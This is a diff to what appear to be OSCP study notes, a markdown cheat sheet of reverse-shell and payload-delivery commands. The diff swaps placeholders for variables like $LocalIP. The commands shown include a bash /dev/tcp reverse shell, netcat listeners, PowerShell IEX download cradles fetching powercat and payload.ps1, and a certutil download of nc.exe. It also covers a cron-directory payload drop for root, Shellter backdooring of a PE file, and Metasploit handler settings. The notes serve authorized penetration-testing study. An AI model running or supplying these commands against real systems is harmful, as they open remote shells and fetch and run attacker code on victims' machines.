@@ -12,7 +12,7 @@ ls /usr/share/webshells/php/       # simple-backdoor.php, php-reverse-shell.php
 ls /usr/share/webshells/aspx/      # cmdasp.aspx
 
 # Edit a Pentestmonkey-style reverse shell's IP/port before hosting it
-sed -i "s/\$ip = '127.0.0.1';/\$ip = '<your_ip>';/" php-reverse-shell.php
+sed -i "s/\$ip = '127.0.0.1';/\$ip = '$LocalIP';/" php-reverse-shell.php
 sed -i "s/\$port = 1234;/\$port = 4444;/" php-reverse-shell.php
 ```
 ```html
@@ -40,7 +40,7 @@ See [[09. Common Web Application Attacks#9.2.3. Remote File Inclusion (RFI)|9.2.
 
 ```bash
 # Bash (Linux), URL-encode if delivered via a POST body/URL parameter
-bash -c "bash -i >& /dev/tcp/<your_ip>/4444 0>&1"
+bash -c "bash -i >& /dev/tcp/$LocalIP/4444 0>&1"
 
 # Netcat listener (run this BEFORE triggering any of the below)
 nc -nvlp 4444
@@ -55,7 +55,7 @@ $EncodedText = [Convert]::ToBase64String($Bytes)
 # Powercat (PowerShell-native netcat), host it and trigger via a download cradle
 cp /usr/share/powershell-empire/empire/server/data/module_source/management/powercat.ps1 .
 python3 -m http.server 80
-# Inject (URL-encoded): IEX (New-Object System.Net.Webclient).DownloadString("http://<your_ip>/powercat.ps1");powercat -c <your_ip> -p 4444 -e powershell
+# Inject (URL-encoded): IEX (New-Object System.Net.Webclient).DownloadString("http://$LocalIP/powercat.ps1");powercat -c $LocalIP -p 4444 -e powershell
 ```
 See [[09. Common Web Application Attacks#9.2.1. Local File Inclusion (LFI)|9.2.1]] (bash), [[09. Common Web Application Attacks#9.3.1. Using Executable Files|9.3.1]] (PowerShell base64), [[09. Common Web Application Attacks#9.4.1. OS Command Injection|9.4.1]] (Powercat), [[12. Client-Side Attacks#12.2.3. Leveraging Microsoft Word Macros|12.2.3]] (delivered via a VBA macro, chunked into ≤255-char string literals), [[12. Client-Side Attacks#Step 4: Build the `.lnk` shortcut payload (the actual reverse-shell trigger)|12.3.1]] (delivered via a `.lnk` shortcut's target field).
 
@@ -69,10 +69,10 @@ See [[09. Common Web Application Attacks#9.2.1. Local File Inclusion (LFI)|9.2.1
 
 ```bash
 # Connect with a private key on a non-standard port
-ssh -i <keyfile> -p <port> <user>@<target>
+ssh -i $BoxDir -p $Port $Username@$BoxIP
 
 # Fix key permissions (required before use)
-chmod 400 <keyfile>
+chmod 400 $BoxDir
 
 # Clear stale host keys (needed when a hostname gets reused across different lab VMs)
 rm ~/.ssh/known_hosts
@@ -84,7 +84,7 @@ cat <keyname>.pub > authorized_keys
 # Convert a key OpenSSL 3.x refuses to load ("error in libcrypto: unsupported")
 # Root cause is usually a corrupted/truncated copy, not real incompatibility, diff against
 # a mechanically re-extracted copy before chasing OpenSSL-version theories
-ssh-keygen -p -m PEM -f <keyfile>
+ssh-keygen -p -m PEM -f $BoxDir
 ```
 See [[09. Common Web Application Attacks#9.1.2. Identifying and Exploiting Directory Traversals|9.1.2]] (the libcrypto troubleshooting saga), [[09. Common Web Application Attacks#9.3.2. Using Non-Executable Files|9.3.2]] (planting a key via upload+traversal).
 
@@ -101,14 +101,14 @@ Two patterns worth having as reflexes when there's no file-upload form to abuse 
 :: repurposed as a downloader (LOLBIN = Living Off the Land Binary, using a legit OS tool
 :: for something it wasn't designed for). No upload tool needed on the target beforehand,
 :: the "downloader" is already sitting there.
-cmd.exe /c certutil -urlcache -split -f "http://<your_ip>/nc.exe" C:\ProgramData\nc.exe
+cmd.exe /c certutil -urlcache -split -f "http://$LocalIP/nc.exe" C:\ProgramData\nc.exe
 ```
 ```bash
 # A root-owned cron job that runs every file in a writable directory, drop a payload
 # and wait for the timer, don't execute it yourself (that only gets you a shell as your
 # own low-priv user, not root). Watch for the dotfile-exclusion gotcha: a bash glob like
 # *.py never matches a leading-dot filename, so the payload's name must NOT start with a dot.
-nc -lnvp <port>                                    # listener, start this first
+nc -lnvp $Port                                    # listener, start this first
 echo "<reverse shell payload>" > /path/to/watched/dir/shell.py   # no leading dot
 # wait up to the cron interval (often ~60s), then check the listener
 ```
@@ -128,11 +128,11 @@ cd /path/to/payload/dir
 python3 -m http.server 80
 
 # Kali: nc listener (for stageless/plain PowerShell payloads)
-nc -nvlp <port>
+nc -nvlp $Port
 ```
 ```powershell
 # Victim: download-and-execute cradle, runs entirely in memory
-powershell -NoP -NonI -W Hidden -Exec Bypass -Command "IEX(New-Object Net.WebClient).DownloadString('http://<kali_ip>/payload.ps1')"
+powershell -NoP -NonI -W Hidden -Exec Bypass -Command "IEX(New-Object Net.WebClient).DownloadString('http://$LocalIP/payload.ps1')"
 ```
 
 For Meterpreter or staged payloads instead of a plain nc shell, replace the nc listener above with msfconsole multi/handler (see the Staged Payload Handler section below).
@@ -170,8 +170,8 @@ PE target path: /path/to/target.exe         # the 32-bit PE to inject into (gets
 Enable Stealth Mode? Y                      # preserves the original PE's execution flow post-payload
 Use listed payload or custom? L             # L for listed, not the payload index number
 Select payload by index: 1                  # 1 = Meterpreter_Reverse_TCP [stager], 5 = Shell_Reverse_TCP [stager]
-LHOST: <kali_ip>
-LPORT: <port>
+LHOST: $LocalIP
+LPORT: $Port
 ```
 
 If the payload menu label says `[stager]`, use the Staged Payload Handler below -- nc alone won't work.
@@ -198,8 +198,8 @@ set PAYLOAD windows/shell/reverse_tcp
 # For staged Meterpreter (Shellter index 1, or msfvenom windows/meterpreter/reverse_tcp)
 set PAYLOAD windows/meterpreter/reverse_tcp
 
-set LHOST <kali_ip>
-set LPORT <port>
+set LHOST $LocalIP
+set LPORT $Port
 run
 ```
 
@@ -219,7 +219,7 @@ When delivering a payload binary to a Windows victim via FTP (e.g. a victim box 
 
 ```bash
 # Active mode (-A) is needed for many Windows FTP servers that don't support passive by default
-ftp -A <target_ip>
+ftp -A $BoxIP
 
 # At the login prompts:
 # Username: anonymous        (type "anonymous" explicitly -- blank Enter gives 530 error)
@@ -527,3 +527,14 @@ Cross-link: [[21. The Metasploit Framework#21.4.1 Resource Scripts|Module 21 §2
 - [RevShells](https://www.revshells.com/) for shell payload selection
 - [CyberChef](https://gchq.github.io/CyberChef/) for encoding and decoding
 - [ippsec.rocks](https://ippsec.rocks/) for technique walkthrough searches
+## Why this matters for OSCP
+
+This page turns one repeatable part of an authorized assessment into a checklist you can apply under exam time pressure.
+
+## Related Modules
+
+- [[MODULES/06. Information Gathering]] -- module concepts used by this hub page
+
+## Demonstrated in box write-ups
+
+- [[OSCP/BOXES/WRITE UPS/AD/Forest|Forest]] -- demonstrates the workflow described here
